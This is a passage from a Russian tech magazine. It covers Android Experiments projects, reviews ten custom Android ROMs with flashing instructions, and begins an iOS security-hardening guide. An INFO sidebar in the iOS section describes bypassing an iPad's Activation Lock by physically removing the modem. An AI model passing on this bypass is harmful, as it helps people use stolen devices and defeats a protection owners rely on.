 и для iOS, но только для джейлбрейкнутых устройств — твик TimePassword.

РЫБИЙ ГЛАЗ ДЛЯ ЗАПУСКА ПРИЛОЖЕНИЙ
 Lens Launcher — очередной инновационный лаунчер для Android. В этот раз
 «инновация» заключается в том, что иконки всех приложений расположены
 на одном рабочем столе и, соответственно, сильно уменьшены. Но стоит при-
 коснуться к экрану, как включается эффект рыбьего глаза, увеличивая иконки
 под пальцем. Выглядит довольно впечатляюще и, конечно же, очень сильно
 напоминает интерфейс Apple Watch. С тем исключением, что это действитель-
 но удобный лаунчер. Видео.





 Когда-то я читал колонку на одном из посвященных продуктам Apple веб-сай-
 тов, где автор очень лестно отзывался об интерфейсе Apple Watch и на пол-
 ном серьезе предлагал применить тот же интерфейс в iOS. Тогда мне эта
 идея показалась нелепой, однако спустя время, опробовав твик WatchSpring
 на iPhone и Lens Launcher на Android, я понял, что это не такое уж сумасше-
 ствие. Да, идею надо дорабатывать и применять не к самому рабочему столу,
 а к меню приложений, но в целом очень и очень неплохо.

 ЧАСЫ КАК ИГРОВАЯ ПЛОЩАДКА
 Tilt — еще один игровой эксперимент. Фишка этого приложения — технология
 дополненной реальности. Ты запускаешь приложение, наводишь его на свои
 часы на базе Android Wear, и смартфон рисует поверх них игровую площад-
 ку. Это полоса препятствий, по которой надо прокатить шарик. Классическая
 игра, которую изначально придумали как подвижный деревянный стол с лаби-
 ринтом и металлическим шариком внутри, а сейчас перенесли в виртуальную
 реальность. Видео.





 Вообще, идея приспособить умные часы для чего-то большего, чем показ
 уведомлений, далеко не нова. На том же сайте есть другой эксперимент, ис-
 пользующий в качестве своеобразного пульта Nintendo Wii: машешь руками
 для того, чтобы птица на экране не падала. Судя по видео, пока что у приложе-
 ния явно есть проблемы с задержкой и определением взмаха.

 3D-ПУЛЬТ
 А как насчет того, чтобы превратить смартфон в пульт управления? Нет,
 не обычный пульт с кнопками, каким твоя бабушка переключает каналы на те-
 левизоре, а 3D-пульт. Проект так и называется — 3D Controller. Пока это всего
 лишь демка, которая позволяет управлять 3D-объектом на экране телевизора
 и играть в простенькие игры, но, как уверяют разработчики, благодаря откры-
 тому API программисты могут реализовать любые другие виды приложений,
 управляемых с пульта. Видео.





 Основное отличие приложения от обычных 3D-пультов, которые продаются
 по пять баксов на aliexpress.com и представляют собой беспроводную мыш-
 ку с гироскопом, в том, что оно работает, используя Chromecast, то есть само
 занимается выводом картинки на экран. Ты можешь установить приложение
 на свой смартфон и использовать его с любым телевизором, к которому под-
 ключен Chromecast.

 РОБОТЫ
 Есть на Android Experiments и несколько проектов роботов. Автономных
 и не очень. Autonomous Android vehicle — робот, единственная задача кото-
 рого — кататься за зеленым шариком, обходя препятствия на своем пути. Ро-
 бот использует смартфон для навигации и слежения за объектом, библиотеку
 компьютерного зрения OpenCV для обработки данных с камеры и плату IOIO
 для связи смартфона с «телом» робота и реализации логики работы.





 К слову, плата IOIO уже давно пользуется популярностью у строителей робо-
 тов на базе Android, поэтому на ней же основаны и все остальные проекты ро-
 ботов, опубликованные на Android Experiments. IOIO Camera robot project —
 собранный из конструктора лего робот, которым можно управлять с другого
 смартфона, видя изображение с камеры. Так же работает IOIO Rover.





 Проекты исключительно экспериментальные и, можно сказать, образователь-
 ные (такими вещами занимаются на втором курсе универа), поэтому у всех ро-
 ботов полностью открытый исходный код, который можно использовать, чтобы
 собрать нечто подобное собственными руками.

ВЫВОДЫ
 А знаешь, что самое интересное во всех этих проектах? То, как Google от-
 носится к нестандартному применению своих продуктов. Android — откры-
 тая платформа, использующая открытые стандарты и по минимум ограничи-
 вающая разработчиков приложений и кастомизаторов. В Play Store никогда
 не было серьезных ограничений на публикацию приложений, и там можно най-
 ти массу софта, привлекающего права root. Google никак не противится раз-
 витию кастомных прошивок и использует любую возможность, чтобы показать,
 на что способны устройства на базе Android.
   Сравни это с поведением Apple, которая везде, где только можно, стара-
 ется внедрить собственные закрытые стандарты, вынуждая людей платить
 за неоправданно дорогую сертифицированную периферию, не оставляет раз-
 работчикам возможностей для действительно полного использования воз-
 можностей устройства и удаляет из App Store интересные приложения (те же
 измерители веса, использующие датчик давления на экран).
    «Don’t be evil» уже давно не слоган Google, но в данном случае он подходит
 на 100%.
    MOBILE
ДЕСЯТКА
                       ОБЗОР                              ПРИВЕРЕДЛИВЫХ  ЛУЧШИХ                БОЛЬШОЙ                     САМЫХ                    ANDROID-ПРОШИВОК                 ДЛЯ





    Самый простой способ серьезно обновить свой гад-
     жет — установить на него кастомную прошивку. С ней ты
    сможешь не только расширить число средств контроля
    над системой, но и попробовать что-то новое, получить
     много удобных функций или даже новую версию Android.
    В этой статье я расскажу о десятке самых популярных, ин-
     тересных и функциональных прошивок, созданных на базе
      Android.

     PARANOID ANDROID
        Сайт: paranoidandroid.co
       Число официально поддерживаемых устройств: 30 (на 08.08.2016)
        Основа: AOSP
       Версия Android: 6.0.1

      Одна из самых инновационных прошивок. Когда-то была популярна благодаря
      возможности динамического переключения между планшетным и смартфон-
     ным интерфейсом Android. В разное время в прошивке существовали такие
       функции, как уведомления в стиле Facebook Heads, ставшее культовым круго-
      вое меню навигации PIE и всплывающие уведомления еще до того, как они по-
      явились в Android 5.0.
       В феврале 2015 года значительная часть разработчиков занялась разви-
      тием OxygenOS для компании OnePlus и покинула команду. Спустя несколь-
       ко месяцев разработка заморозилась, остановившись на версии 5.1 Lollipop.
      Сейчас новая команда пытается оживить этот проект. Последняя версия 6.0.3
      включает в себя следующие возможности:
       •  Floating peek — позволяет открыть окно приложения поверх другого;
       •  Immersive Mode — скрывает статусбар или клавиши навигации в любом при-
         ложении;
       •  «Темы» — движок тем CyanogenMod;
       •  настройки отображения значка батареи;
       •  удобный способ перемещения переключателей в окне быстрых настроек
         с помощью удержания пальца;
       •  для OnePlus, OPPO, Nexus 5X, Nexus 6P имеются настройки жестов и режим
        «В кармане» (переименованный Peek).

      Функций не так много, но надеемся, что со временем проект будет обрастать
      интересными, полезными и эксклюзивными функциями. Кстати, обновления
      приходят по OTA (от разработчиков этой прошивки, конечно). Больше всего
      разочаровало отсутствие русских букв в номеронабирателе из звонилки. Про-
      шивка не умеет работать с разделами, отформатированными в F2FS.





                                    Темы                  Настройка значка батареи

    OMNIROM
       Официальный сайт: omnirom.org
       Число официально поддерживаемых устройств: 84 (на 08.08.2016)
        Основа: AOSP
       Версия Android: 6.0.1

     OmniROM родилась в ответ на «коммерциализацию» CyanogenMod. В чис-
      ло ее разработчиков входят Dees Troy (автор TWRP) и очень известный раз-
      работчик Chainfire (SuperSU, LiveBoot, Recently, FlashFire, Mobile Odin и другие
      классные приложения).
         Ключевая особенность — какую функциональность добавить, выбирают
      сами пользователи, голосуя. В настройках есть любопытный пункт «Произ-
       водительность». Он позволяет настроить частоты работы процессора, алго-
      ритмы ввода-вывода, агрессивность менеджера задач (именно он выполняет
      работу таск-киллеров), а также посмотреть ряд интересных параметров. Все
      остальные функции стандартны и реализованы в других подобных прошив-
        ках. Однако, кроме всего прочего, здесь можно включить «темную тему» в на-
       стройках, а для переключения между приложениями доступна альтернативная
      панель OmniSwitch. Также в OmniROM есть система обновления OpenDelta,
      позволяющая уменьшить размер OTA-обновлений прошивки на 90%.
         Огорчает только то, что все новые пункты в настройках не переведены
      на русский язык, отсутствует настройка кнопок и возможность уменьшить раз-
      мер панельки навбара. Поддержка F2FS отсутствует. В номеронабирателе
       русских букв тоже нет.





                      Настройки в темной теме                                 Часы


    CYANOGENMOD
       Официальный сайт: cyanogenmod.org
       Число официально поддерживаемых устройств: 376 (на 06.08.2016)
        Основа: AOSP
       Версия Android: 6.0.1

      CyanogenMod — одна из первых кастомных прошивок, появившаяся вско-
      ре после того, как пользователи нашли метод получения root на первом
      Android-смартфоне HTC Dream. Изначально прошивка базировалась на сто-
        ке, то есть была создана не путем добавления функциональности в AOSP
      и пересборки исходного кода, а пересборкой образа с прошивкой, что суще-
      ственно ограничивало возможности разработчиков. Но вскоре ее создатели
      (называющие себя Team Douche) перешли на сборку из исходных текстов.
       Со временем функций становилось все больше и больше, но прошив-
       ка сохраняла стабильность и скорость работы. Уже к своей 6-й версии
      CyanogenMod превосходил стоковый Android 2.2 практически по всем пара-
      метрам (скорость работы, энергопотребление, стабильность). В прошивку
       «из коробки» были вшиты полезные дополнения, такие как планировщик задач
      BFS, кодек FLAC и множество дополнительных опций настройки.
         Сегодня CyanogenMod — это своего рода эталон, отличающийся гигант-
      ским списком официально поддерживаемых устройств и не менее гигантским
      списком устройств, портированных независимыми энтузиастами. Прошивка
      очень часто используется в качестве базы, поэтому все прошивки, основан-
      ные на CM, превосходят его по возможностям. Подробнее о преимуществах
      CyanogenMod ты можешь прочитать в нашей статье «Долой сток!».





                     Знаменитый эквалайзер                Одни из самых интересных
                                                              пунктов настроек, которых
                                                         многим не хватало на стоке


    КОМБАЙНЫ

     Temasek’s
       Официальный сайт: github.com/temasek
       Число официально поддерживаемых устройств: только неофициальные сборки
        Основа: CyanogenMod
       Версия Android: 6.0.1

     В один день @temasek c форумов XDA решил немного улучшить CyanogenMod,
      добавив в него пару нужных программ и функций с других прошивок. А потом
      не смог остановиться... Этот ROM довольно популярен, но автор никуда не вы-
      кладывал порт прошивки, хоть и сам создавал ее для своего Samsung Note 3.
      Количество устройств растет только за счет неофициальных портов.
         Собственно, это даже не оригинальная прошивка, а сборная солянка из ча-
       стей различных прошивок, включая все описанные ранее. В качестве основы
       выступает CyanogenMod. Функций и настроек очень много. Настолько много,
       что подогнать прошивку под свои вкусы можно без использования Xposed. Тут
      можно найти не только неплохо настраиваемый PIE, но и различные панели,
      выдвигаемые жестами с различных частей экрана, настроить анимацию, про-
       зрачность шторки с быстрыми настройками. Описать все возможности статьи
      не хватит.
       В прошивке есть режим плавающих окон, как в Android 7 (он же доступен
       в далее описанных AICP и RR), пять режимов энергосбережения (от «Эконо-
      мия энергии» до «Высокая производительность»), а также ряд полезных про-
      грамм: ViPER4Android, SuperSU, OmniSwitch. Для полного фарша не хватает
       только таких замечательных программ, как Kernel Adiutor, L Speed, AdAway, на-
       строек показа уровня сигнала в Dbm и переключения между 2G/3G из панели
      быстрых настроек. Увы, и баги тут тоже присутствуют. При активации некото-
      рых пунктов настроек выскакивает ошибка графического интерфейса.





                                            PIE               Именно в этом комбайне
                                                            сохранился правильный ре-
                                                 жим редактирования кнопок


     AICP (Android Ice Cold Project)
       Официальный сайт: aicp-rom.com
       Число официально поддерживаемых устройств: 71 (на 13.08.2016)
        Основа: CyanogenMod
       Версия Android: 6.0.1

     Еще один комбайн. Изначально ROM создавался для HTC Desire HD на осно-
      ве AOKP. Со временем к разработке присоединялось очень много других раз-
       работчиков, а вместе с ними росло и количество поддерживаемых девайсов.
     Не менее успешно этот проект обрастал и функциями. После выхода Android
        Lollipop разработчики AOKP сообщили, что приостанавливают разработку
      на неопределенный срок, из-за чего AICP был переведен на CM. В настоящее
      время разработчики заявляют, что эта прошивка включает в себя абсолютно
      все необходимые расширения, так что никакие дополнительные твики не по-
       надобятся.
        Это действительно так, AICP имеет почти все функции, присутствующие
       в других прошивках. Плюс сюда вшиты SuperSU, AdAway и OmniSwitch, но нет
       ViPER4Android. Меню настроек не сильно отличается от меню в стоковом
      CyanogenMod, хоть и включает в себя некоторые новые пункты. А вот после
      нажатия на «Расширенные настройки» открывается океан дополнительных на-
       строек. Тут есть настраиваемый индикатор сетевого трафика, полоса заряда
       аккумулятора, плавающие окна, PIE и другие интересные настройки, например
      удаление системных приложений, кеш прокрутки, опции прозрачности.
         Удивило, что нельзя включить фонарик, удерживая кнопку питания при не-
      активном дисплее. Оказалось, чтобы получить эту функцию, необходимо пе-
      рейти в «Экран блокировки» и активировать «Уведомление фонарика». Всему
      виной неправильный перевод, прошивка переведена на русский на 70–80%.





                    Расширенные настройки                          Диспетчер задач


    RR (Resurrection Remix)
       Официальный сайт: forum.resurrectionremix.com
       Число официально поддерживаемых устройств: 91 (на 09.08.2016)
        Основа: CyanogenMod
       Версия Android: 6.0.1

      Создатели прошивки решили включить в свое творение лучшие функции
      из CM, Slim и Omni. А в качестве стартовой площадки использовать Remix.
     В итоге появился весьма интересный комбайн.
        Прошивка полностью корректно переведена на русский язык. Тут есть не-
       сколько отлично настраиваемых панелей с недавними приложениями (Slim,
      OmniSwith и стандартные из AOSP), вшиты AdAway, Kernel Adiutor, SuperSU
       (при желании можно использовать и стандартный контроллер root-доступа
      из CyanogenMod).
         Подстроить и настроить можно почти все. Эта прошивка по праву разде-
       ляет первое место по нашпигованности различными функциями с Temasek,
      а может, и превосходит его. Не всем любителям максимально настраиваемых
      прошивок понравится механизм настройки наэкранных клавиш: нельзя поста-
       вить дополнительные клавиши с правого и левого краев (там, где обычно ото-
      бражается значок меню и переключения клавиатур).
        Из недостатков: режимов энергосбережения меньше, чем в Temasek,
       кнопки быстрых настроек настраиваются неочевидным способом — нужно
      удерживать палец на шестеренке, которая ведет в настройки. Официально
      CAF-версия не выпускается, однако владельцы Nexus 5 могут загрузить нео-
      фициальную по ссылке.





                             Океан настроек           Настройки недавних приложений

    MK (MoKee)
       Официальный сайт: mokeedev.com/en/
       Число официально поддерживаемых устройств: 220 (на 13.08.2016)
        Основа: CyanogenMod
       Версия Android: 6.0.1

      Разработчики запустили этот проект 12 декабря 2012 года и с того времени
      постоянно улучшали его, задавшись целью добавлять только самые лучшие
      функции из других прошивок. На данный момент это CyanogenMod, OmniROM
      и SlimRoms.
        Прошивка имеет что-то общее с Paranoid Android: функций не очень много
      по сравнению с конкурентами, но самые полезные присутствуют. В эту про-
      шивку уже вшит ViPER4Android FX, есть возможность изменить высоту навба-
       ра, можно отобразить секунды в часах, скорость входящего и исходящего тра-
       фика, настроить включение экрана двойным тапом. В качестве интерфейса
       это все тот же CM, только в нем поменялась анимация всплывающих тексто-
      вых уведомлений, а навбар теперь всегда красится в цвет строки состояния во
      многих приложениях.
         Скорость работы не уступает чистому CyanogenMod, присутствуют обнов-
      ления по OTA-каналу. Причем все функции полностью русифицированы. Сто-
       ит отметить, что тут есть приложение «Защитник» — что-то вроде антивируса.
      Позволяет управлять некоторыми разрешениями приложений. Для разблоки-
      ровки части экспериментальных функций нужно открыть «Настройки   Панель
      MoKee» и нажать несколько раз на «Версия MoKee».





                                                         Приложение «Защитник»





                              ViPER4Android FX
                                                            Продолжение статьи
MOBILE


                 Начало                   статьи    ДЕСЯТКА                     ОБЗОР    ЛУЧШИХ               БОЛЬШОЙ                   САМЫХ                  ANDROID-ПРОШИВОК               ДЛЯ                     ПРИВЕРЕДЛИВЫХ



ОСОБЕННЫЕ

FlymeOS
Официальный сайт: flymeos.com
Число официально поддерживаемых устройств: 73 (на 08.08.2016)
Основа: CyanogenMod
Версия Android: 5.1.1

Прошивка создана и портируется на различные устройства компанией Meizu
Technology Co., Ltd. Нетрудно догадаться, что она преследовала цель популя-
ризовать собственные смартфоны. Полный список поддерживаемых устройств
доступен только в китайской версии сайта.
   Интерфейс  по-настоящему  оригинален. Абсолютно  все  стандартные
приложения из Android заменены на приложения собственной разработки,
а остальные значительно доработаны. В панели уведомлений есть быстрые
переключатели, которые появляются над уведомлениями. Раздел «Энергопо-
требление» переименован в «Управление питанием» и намного более удобен
и информативен, кнопка «Режимы сети» позволяет включить режимы «Только
3G» и «Только 2G».
   К скорости работы графической оболочки никаких нареканий нет. Все
очень быстро и плавно. Стоит сказать, что в прошивку встроен интересный
механизм управления разрешениями. Он позволяет ограничить значительно
больше параметров, чем Android Marshmallow. Интерфейс настроек и почти
всех системных приложений полностью русифицирован. А вот во всех прило-
жениях, которые работают через интернет, ты увидишь только китайские иеро-
глифы, но метод научного тыка и знание того, как устроены подобные прило-
жения, вполне позволяют ими пользоваться.
  В китайском аналоге Play Store есть почти все популярные (и не очень) при-
ложения. Но гугловские программы откажутся работать без сервисов Google
Play, а поставить эти сервисы не так-то просто. В интернете есть решение про-
блемы, но работает оно далеко не всегда, придется пользоваться либо встро-
енным маркетом, либо разными неофициальными магазинами, а также сми-
риться с тем, что некоторые приложения «не заведутся» без Google Services.





                 Панель уведомлений                                 Маркет


ВЫБЫЛИ ИЗ ТЕСТА

Bliss
Официальный сайт: blissroms.com
Число официально поддерживаемых устройств: 48 (на 13.08.2016)
Основа: CyanogenMod
Версия Android: 6.0.1

Разработчики утверждают, что Bliss — одна из самых настраиваемых поши-
вок. На самом деле это не так. Прошивка действительно представляет собой
сборку интересных функций из других прошивок, но до RR, AICP или Temasek
ей очень далеко. Разве что изначально вшиты и запускаются через настройки
Kernel Adiutor и SuperSU. Настройки самой прошивки не переведены на рус-
ский язык. Перевод касается только пунктов, которые есть в CyanogenMod.

crDroid
Официальный сайт: ww2.crdroid.org
Число официально поддерживаемых устройств: 29 (на 09.08.2016)
Основа: CyanogenMod
Версия Android: 6.0.1

Цель создания, как и у всех, — добавить самые лучшие функции из других
прошивок. На экране приветствия при первоначальной настройке написано,
что прошивка включает в себя очень много функций из OmniROM, Paranoid
Android, Temasek и других. К сожалению, тут та же история, что и с Bliss. От-
сутствие эксклюзивных функций и значительное отставание по возможностям
от RR, AICP, Temasek. Никаких интересных приложений не встроено.

ВНЕ ТЕСТА
•  NexSense 6.0 — попытка портировать HTC Sense 6.0 (Android 4.4.2) на Nexus
   5. Сначала запускалась только сама прошивка, но со временем энтузиасты
   смогли заставить заработать Wi-Fi, Bluetooth, GPS, различные сенсоры.
  Но очень долгое время этого не получалось добиться от камеры и звука.
  Со временем разработчики пришли к выводу, что необходимо практически
   с нуля переписать некоторые библиотеки. Местные умельцы вроде бы пы-
   тались это сделать, но безуспешно.
• ASUS ZENUI CM 13 (Nightly) Based — проект по портированию приложений
   из Asus ZenUI в CyanogenMod 13. Официально разработка ведется только
   для LG G2. По заверениям разработчиков, уже перемещено около 90% всех
   приложений.
•  MIUI — прошивка официально портирована на 286 различных устройств.
   Разрабатывается фирмой  Xiaomi и основывается на исходных кодах
  CyanogenMod и AOSP. Много фишек сюда перекочевало из iOS, TouchWiz,
  UX (LG), HTC Sense, но есть и свои собственные. Полезных функций настоль-
   ко много, что их описание — тема для отдельной статьи.
•  Maru OS — очень оригинальная прошивка, которая при подключении смарт-
  фона к монитору делает из него полноценный десктоп. Прочитать подроб-
   ный обзор и интервью с разработчиком можно у нас.

КАК УСТАНОВИТЬ?
Для большинства девайсов прошивка со стока выглядит следующим образом:
1. Разблокируем загрузчик (для каждого девайса это индивидуально, так что
   вперед, в Google).
2. Устанавливаем кастомный рекавери (в редких случаях можно и без него ста-
   вить кастомы, но это не очень хорошая идея).
    2.1. Идем на официальный сайт TWRP, вводим там имя своего девайса, за-
      гружаем для него самую новую версию.
    2.2. Подключаем смартфон по USB, устанавливаем на компьютер драйверы
       для своего устройства.
    2.3. Скачиваем и устанавливаем Android SDK.
    2.4. Запускаем терминал и прошиваем рекавери командой fastboot flash
       recovery имя_рекавери.img (fastboot находится в папке platform-tools
       внутри SDK).
3. После прошивки заходим в TWRP, выбираем русский язык (в самом низу),
   ставим галочку на «Разрешить изменения» и свайпаем вправо.
4. Переходим в раздел «Очистка» и там выбираем «Форматировать Data». Это
   нужно, если раздел data зашифрован.
5. Подключаем смартфон к компьютеру и перекидываем на карту памяти файл
   с новой прошивкой.
6. Выбираем «Установка», а потом файл прошивки. Соглашаемся свайпом
   вправо.
7. Нажимаем на «Перезагрузка в ОС»
   и ждем окончания загрузки (около
   десяти минут, включая оптимиза-
  цию приложений).
8. После первоначальной настрой-
   ки рекомендуем опять загрузить-
   ся в рекавери и сделать бэкапы.
   Как минимум — EFS-раздела, в ко-
   тором вшиты IMEI, s/n и другие важ-
   ные данные.

Если ты не хочешь терять основную
прошивку, кастом можно установить
второй системой. В этом поможет
единственный в своем роде MultiROM
Manager. Он  позволяет  установить
сразу несколько прошивок. Выбрать
прошивку из установленных девайс
предлагает при включении. Установка
программы достаточно проста (только
не забудь перед этим сделать резерв-
ные копии на всякий случай):
1. Устанавливаем MultiROM Manager
   из Play Store и запускаем его.
2. Нажимаем кнопку «Установить».
3. Ждем окончания установки, а по-
   том соглашаемся на перезагрузку.
4. После перезагрузки и установки                                               Главный экран MultiROM Manager
   некоторых скриптов откроется ин-
   терфейс выбора прошивки.

Установка второй прошивки выполняется через MultiTWRP в разделе Advanced
  MultiROM либо через само приложение.

Словарик

•  Stock (сток, стоковая прошивка) — официальная прошивка, предуста-
   навливаемая производителем по умолчанию. Также стоковыми часто назы-
   вают не только абсолютно чистые образы стоковых прошивок, но и образы,
   подготовленные для установки через неофициальные рекавери.
•  AOSP (Android Open Source Project) — оригинальные исходные коды
   Android от компании Google, доступные для скачивания и модификации
   всем желающим. Термин «основанная на AOSP прошивка» (based on stock,
   based on AOSP) означает, что прошивка была собрана на базе этих исход-
   ников (а не исходников CyanogenMod, как это иногда бывает). Большинство
   модификаций Xposed работают только в AOSP/CyanogenMod и основанных
   на них прошивках.
•  CAF (Code Aurora Forum) — поддерживаемый Linux Foundation проект,
   форсирующий продвижение открытого кода в мобильную технику. Главный
   участник проекта — компания Qualcomm, поддерживающая репозиторий
    Android for MSM, который содержит исходные тексты Android с оптимизаци-
   ями для чипов Qualcomm. Если разработчики заявляют, что их прошивка ос-
   нована на CAF, значит, она включает все эти оптимизации. Но стоит иметь
   в виду, что изменения из Android for MSM зачастую перетекают в AOSP.
•  CyanogenMod Based (CM based, основано на CynogenMod) — про-
   шивка, основанная на коде CyanogenMod. Сразу после выхода новой версии
   AOSP разработчики CyanogenMod копируют его исходники в собственный
   репозиторий и начинают внедрять в него свои дополнения и портировать
   на новые устройства. А устройств в списке поддерживаемых CyanogenMod
   такое внушительное число, что многие разработчики кастомных прошивок
   выбирают в качестве базы именно его, а не AOSP.
•  Recovery (режим восстановления, рекавери) — консоль восстанов-
   ления Android. Предназначена для того, чтобы сделать сброс до заводских
   настроек или установить zip-файл прошивки, подписанной ключом произ-
   водителя. Для многих устройств существуют сторонние recovery с расши-
   ренными функциями, такие как ClockworkMod, TWRP, Philz. Они позволяют
   делать полные бэкапы как всей системы, так и отдельных частей, устанав-
   ливать сторонние прошивки, форматировать и менять размер разделов,
   устанавливать любые дополнения и много чего другого полезного.
•  Bootloader (загрузчик, бутлоадер) — загружается в первую очередь.
   Он передает ядру таблицу разделов встроенной NAND-памяти, загружа-
   ет его в память и запускает. Именно загрузчик осуществляет подключение
    к ПК в режиме fastboot и запускает рекавери. Поэтому перед установкой ка-
   стомного recovery и зачастую сторонней прошивки его приходится разбло-
   кировать. Почти всегда после разблокировки загрузчика из памяти устрой-
   ства стираются абсолютно все данные.
•  GApps (Google Apps) — набор сервисов и приложений от Google. Паке-
   ты GApps бывают различных размеров, от самых маленьких (меньше 100
   Мбайт), которые включают в себя только Google Play и сервисы для его ра-
   боты, до больших, которые содержат почти все существующие гугловские
   приложения (размер таких пакетов приближается к 800 Мбайт). Многие
   разработчики прошивок рекомендуют ставить Open GApps. Отличия между
   версиями можно посмотреть в Wiki по Open GApps. Следует иметь в виду,
   что некоторые приложения GApps могут заменить системные приложения.
•  Nightly («ночнушка») — ночная сборка прошивки. Для многих устройств
   сборки делаются ежедневно (еженощно). В теории обладают низкой ста-
   бильностью, но на практике неудачные сборки встречаются крайне редко,
   а всплывшие баги исправляются очень быстро.


Файловая система F2FS

Почти все кастомные прошивки поддерживают файловую систему F2FS, кото-
рая разработана специально для работы с флеш-памятью и в теории эффек-
тивнее и более бережно ее использует, чем ext4. Перейти на эту ФС можно
следующим способом:
1. Зайти в TWRP.
2.0. Открыть пункт «Очистка   Выборочная очистка».
2.1. Отметить раздел Cache.
2.2. Нажать «Восстановить или изменить файловую систему   Изм. файловую
систему   F2FS» и свайпнуть для подтверждения.
2.3. Нажать кнопку «Домой».
3. Повторить пункт 2 для разделов data и system.

Примечания:
•  Не все прошивки поддерживают F2FS. Если поддержка отсутствует, ты пой-
  маешь бесконечную загрузку.
•  После изменения файловой системы раздела data потеряются не только
   данные программ и настройки прошивки, но и файлы, сохраненные на вну-
   тренней карте памяти.
•  На практике выигрыш в производительности составит в лучшем случае не-
   сколько процентов.



ЗАКЛЮЧЕНИЕ
Мы рассмотрели далеко не все существующие прошивки. Однако даже этого
хватит, чтобы иметь представление о современных прошивках. По интерфейсу
они почти все похожи, все работают очень плавно, и какие-либо отличия в ско-
рости работы заметить очень сложно. А вот функции у них разные. От себя
могу добавить, что если долго посидеть хотя бы на MoKee или тем более
Resurrection Remix, то возвращаться даже на чистый CyanogenMod уже не за-
хочется. А вот к помощи Xposed наверняка придется обратиться. К счастью,
почти во всех существующих кастомных прошивках работают практически лю-
бые модули Xposed.
MOBILE
УКРЕПЛЯЕМ
КРЕПОСТЬ
КАК СДЕЛАТЬ IOS
ЕЩЕ БЕЗОПАСНЕЕ
И ЗАЩИТИТЬ
СМАРТФОН
ПОСЛЕ
ДЖЕЙЛБРЕЙКА





   Михаил Филоненко
    mfilonen2@gmail.com





Каждый из нас задается простым в формулировке,
но очень сложным в реализации вопросом: как защитить
свое мобильное устройство, будь то смартфон или план-
шет? Это раньше на «звонилках» был минимум данных
и они никак не могли быть полезны другим. Сейчас же че-
ловек, заполучивший доступ к чужой переписке, заметкам
или аккаунтам, может обнародовать и вправду ценные
личные данные, украсть деньги с привязанной к аккаунту
карточки, иногда даже узнать пароли от других устройств
или сайтов. Защита таких данных становится не просто
важной частью работы с устройствами, а задачей перво-
степенной важности.

С момента появления сотовых телефонов и КПК производители оснащали их
минимальной защитой от кражи данных. Но никто раньше не воспринимал эти
попытки всерьез, а систем, обеспечивающих качественную и надежную защи-
ту, были единицы. Но времена меняются, и сегодня каждое новшество в этой
сфере, будь то сканер отпечатков пальцев и сетчатки глаза, двухфакторная ау-
тентификация или еще более сложные способы авторизации, пользователи
приветствуют и активно используют.
   Следует признать, что Apple, изначально акцентируя внимание на без-
опасности, сделала свои устройства практически неуязвимыми для кражи
данных — благодаря большому количеству ограничений системы и желанию
контролировать все, что происходит в каждом аппарате, благодаря архитек-
туре чипсетов собственной разработки, благодаря, в конце концов, огромной
пользовательской аудитории, которая поневоле становится тестером новых
систем и функций.
   Сегодня Apple начинает платить вознаграждения тем, кто найдет «дырки»
в созданной ею системе. Причем премии совсем немаленькие — от 25 до 200
тысяч долларов, а значит, компания ожидает, что таких находок не будет мно-
го. Этому поспособствовало и вхождение в состав профильного отдела ком-
пании ряда хакеров, ранее занимавшихся созданием джейлбрейк-утилит.
   Однако, насколько бы ни была сильна система безопасности, напрямую со-
хранность личных данных зависит только от пользователя устройства. И если
он осознанно рискует, никакая прошивка не сможет ему помочь. В этой статье
мы рассмотрим, какими способами можно обеспечить сохранность личных
данных.

ПЕРВЫЕ ШАГИ
Начнем с наиболее простых мер безопасности. Что рекомендуется сделать
в первую очередь?
   Главное и основное — установить надежный пароль на экран блокировки
и включить функцию «Найти iPhone». В этой комбинации, при прочих равных,
устройство просто невозможно будет перепрошить после кражи и продать.
Желающих красть iOS-устройства с каждым годом все меньше, а эффективных
возможностей обхода Activation Lock еще не придумали (технология существу-
ет с 2013 года, с выхода iOS 7). Пароль на экране блокировки можно сбросить,
но только через перепрошивку, которая окажется невозможной.
   Есть, правда, ряд хитростей, позволяющих обходить экран блокировки.
Долгое время многие из них были связаны с использованием голосового по-
мощника Siri, а потому лучше вовсе отключить его. Скажем прямо — сегодня
это инструмент не первой необходимости, а важные задачи с его помощью
решают единицы, особенно в нашей стране.
  Даже если смартфон прекрасно защищен от взлома, то от кражи личных
данных, находящихся на экране блокировки, это не спасет. Поэтому лучше во-
обще отключить уведомления на LockScreen. Это делает-
ся для каждого приложения индивидуально. Необходимо
зайти в настройки, затем выбрать необходимое приложе-
ние, далее отключить опцию «На заблокированном экра-
не». К сожалению, если приложений очень много, это мо-
жет затянуться надолго, ведь общих настроек для всех
уведомлений в системе нет.                                 INFO
   Разумеется, в таком случае и меню центра уведом-                                                                        Программной
лений также необходимо отключить. Для этого перейди        возможности
в раздел «Touch ID и пароль» все тех же настроек, затем     разблокировки iPad
                                                                               с Activation Lockдеактивируй все четыре параметра в разделе «Опции                                                                                         нет, но есть один
с блокировкой экрана»: «Сегодня», «Просмотр уведомле-                                                                          аппаратный способ,
ний», «Ответить сообщением» и «Wallet». Эти ограничения      заключающийся
не зря внесены в раздел, доступ к которому предоставля-        в физическом
                                                                            удалении модема
ется только после дополнительной авторизации.                                                                           из устройства. Таким
  В жизни бывают разные ситуации, а забыть заблоки-      образом модель
ровать устройство может каждый. Поэтому включи опцию       аппарата после
                                                                          перепрошивкиавтоблокировки в одноименном подразделе пункта меню                                                                              сменится, а пароль
«Основные» настроек.                                                  блокировки уже
  В результате подобной конфигурации экран блоки-       не потребуется
                                                                                   вводить. Данныйровки в безопасности, а злоумышленники, скорее всего,
                                                                           способ работает
не смогут добраться до данных на устройстве. Но пред-                                                                           не на всех моделях
ставим, что все же им удалось это сделать. Как обезопа-     планшетов от Apple.
сить данные на разблокированном устройстве?

ПРОГРАММЫ, ОБЕСПЕЧИВАЮЩИЕ БЕЗОПАСНОСТЬ ДАННЫХ
Итак, по неосторожности пользователя или каким-то хитрым способом злоу-
мышленнику удалось разблокировать устройство. Но ведь это вовсе не озна-
чает, что данные уже у него. Посмотрим, каким образом можно обезопасить
данные отдельных программ.
   Здесь ты столкнешься с трудностью — в самой iOS мало инструментов
для этого, а все сторонние утилиты требуют выполнения джейлбрейка, проце-
дуры, которая ломает безопасность смартфона. Однако если смартфон уже
взломан и ты не хочешь отказываться от джейлбрейка, то дадим несколько ре-
комендаций.
   Первый шаг — ввести ограничения на изменение определенных опций. Это
системная функция, включается она в меню «Ограничения» раздела «Основ-
ные» настроек устройства. Здесь можно отрегулировать множество параме-
тров — от использования браузера Safari до запрета на изменение громкости.
Подумай, какие возможности для тебя наиболее важны, остальное желательно
отключить.

                                                             Параметры
